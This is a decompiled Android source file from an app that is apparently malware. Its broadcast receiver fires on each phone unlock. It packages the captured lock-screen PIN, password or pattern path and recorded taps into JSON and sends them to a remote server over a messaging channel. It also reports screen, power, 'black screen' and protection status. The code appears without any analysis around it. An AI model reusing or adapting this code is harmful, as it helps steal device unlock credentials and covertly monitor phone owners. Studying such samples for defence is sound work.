package com.mamimobi.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.mamimobi.AccessService;
import com.mamimobi.service.SSService;
import defpackage.fa0;
import defpackage.j31;
import defpackage.lm0;
import defpackage.o71;
import defpackage.o80;
import defpackage.pk0;
import defpackage.sa0;
import defpackage.t40;
import defpackage.vh0;
import defpackage.xm0;
import io.nats.client.support.ApiConstants;
import java.util.concurrent.atomic.AtomicInteger;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class SCNReceiver extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        try {
            o71 o71VarF = o71.f(context);
            lm0 lm0Var = o71VarF.e;
            String strV = t40.V(context);
            if ("android.intent.action.USER_PRESENT".equals(intent.getAction())) {
                xm0.a();
                pk0.e();
                AccessService.E0 = new StringBuilder();
                AccessService.D0.set(false);
                AccessService.F0.set(false);
                vh0.r.set(false);
                vh0.s.set(false);
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(ApiConstants.ID, strV);
                jSONObject.put(ApiConstants.ACTION, "unlock");
                jSONObject.put("locked", false);
                jSONObject.put("isRunning", AccessService.e0 != null);
                jSONObject.put("isBlackScreen", AccessService.J0.get());
                jSONObject.put("isProtected", AccessService.M0.get());
                jSONObject.put("batteryLevel", t40.X(context));
                if (o71VarF.e() != null) {
                    jSONObject.put("clientid", o71VarF.e());
                }
                AtomicInteger atomicInteger = AccessService.C0;
                jSONObject.put("lockType", atomicInteger.get());
                if (atomicInteger.get() == 1) {
                    if (AccessService.f0.isEmpty()) {
                        AccessService.f0 = fa0.q0(context, "CURPST", "");
                    } else {
                        fa0.Q0(context, "CURPST", AccessService.f0);
                    }
                    jSONObject.put("password", AccessService.f0);
                    sa0.c(context);
                    jSONObject.put(ApiConstants.DATA, fa0.q0(context, "CLICK", ""));
                } else if (atomicInteger.get() == 2) {
                    if (AccessService.g0.isEmpty()) {
                        AccessService.g0 = fa0.q0(context, "CURPST", "");
                    } else {
                        fa0.Q0(context, "CURPST", AccessService.g0);
                    }
                    jSONObject.put("password", AccessService.g0.replaceAll("[^a-zA-Z0-9!@#$%^&*]", ""));
                    jSONObject.put(ApiConstants.DATA, fa0.q0(context, "MIXCLICK", ""));
                } else if (atomicInteger.get() == 3) {
                    jSONObject.put("password", AccessService.f0);
                    jSONObject.put(ApiConstants.DATA, fa0.q0(context, "PATH", ""));
                }
                lm0Var.c(jSONObject.toString().getBytes());
            } else if ("android.intent.action.SCREEN_ON".equals(intent.getAction())) {
                JSONObject jSONObject2 = new JSONObject();
                jSONObject2.put(ApiConstants.ID, strV);
                jSONObject2.put(ApiConstants.ACTION, "screen_on");
                jSONObject2.put("locked", o80.J(context));
                jSONObject2.put("isBlackScreen", AccessService.J0.get());
                jSONObject2.put("isProtected", AccessService.M0.get());
                jSONObject2.put("isRunning", AccessService.e0 != null);
                jSONObject2.put("batteryLevel", t40.X(context));
                t40.w0(context, jSONObject2);
                jSONObject2.remove("screen");
                if (o71VarF.e() != null) {
                    jSONObject2.put("clientid", o71VarF.e());
                }
                lm0Var.c(jSONObject2.toString().getBytes());
                Intent intent2 = new Intent(context, (Class<?>) SSService.class);
                intent2.setAction("com.cx.ACTION_PUSH_SCREEN_STATE");
                intent2.putExtra(ApiConstants.ACTION, "screen_on");
                context.startService(intent2);
            } else if ("android.intent.action.SCREEN_OFF".equals(intent.getAction())) {
                JSONObject jSONObject3 = new JSONObject();
                jSONObject3.put(ApiConstants.ID, strV);
                jSONObject3.put(ApiConstants.ACTION, "screen_off");
                jSONObject3.put("locked", o80.J(context));
                jSONObject3.put("isBlackScreen", AccessService.J0.get());
                jSONObject3.put("isProtected", AccessService.M0.get());
                jSONObject3.put("isRunning", AccessService.e0 != null);
                jSONObject3.put("batteryLevel", t40.X(context));
                t40.w0(context, jSONObject3);
                jSONObject3.remove("screen");
                if (o71VarF.e() != null) {
                    jSONObject3.put("clientid", o71VarF.e());
                }
                lm0Var.c(jSONObject3.toString().getBytes());
                Intent intent3 = new Intent(context, (Class<?>) SSService.class);
                intent3.setAction("com.cx.ACTION_PUSH_SCREEN_STATE");
                intent3.putExtra(ApiConstants.ACTION, "screen_off");
                context.startService(intent3);
            } else if ("android.intent.action.ACTION_POWER_CONNECTED".equals(intent.getAction())) {
                JSONObject jSONObject4 = new JSONObject();
                jSONObject4.put(ApiConstants.ID, strV);
                jSONObject4.put(ApiConstants.ACTION, "power_connected");
                jSONObject4.put("locked", o80.J(context));
                jSONObject4.put("isBlackScreen", AccessService.J0.get());
                jSONObject4.put("isProtected", AccessService.M0.get());
                jSONObject4.put("isRunning", AccessService.e0 != null);
                jSONObject4.put("batteryLevel", t40.X(context));
                if (o71VarF.e() != null) {
                    jSONObject4.put("clientid", o71VarF.e());
                }
                lm0Var.c(jSONObject4.toString().getBytes());
            } else if ("android.intent.action.ACTION_POWER_DISCONNECTED".equals(intent.getAction())) {
                JSONObject jSONObject5 = new JSONObject();
                jSONObject5.put(ApiConstants.ID, strV);
                jSONObject5.put(ApiConstants.ACTION, "power_disconnected");
                jSONObject5.put("locked", o80.J(context));
                jSONObject5.put("isBlackScreen", AccessService.J0.get());
                jSONObject5.put("isProtected", AccessService.M0.get());
                jSONObject5.put("isRunning", AccessService.e0 != null);
                jSONObject5.put("batteryLevel", t40.X(context));
                if (o71VarF.e() != null) {
                    jSONObject5.put("clientid", o71VarF.e());
                }
                lm0Var.c(jSONObject5.toString().getBytes());
            }
        } catch (Exception unused) {
        }
        j31.g0(context.getApplicationContext());
    }
}
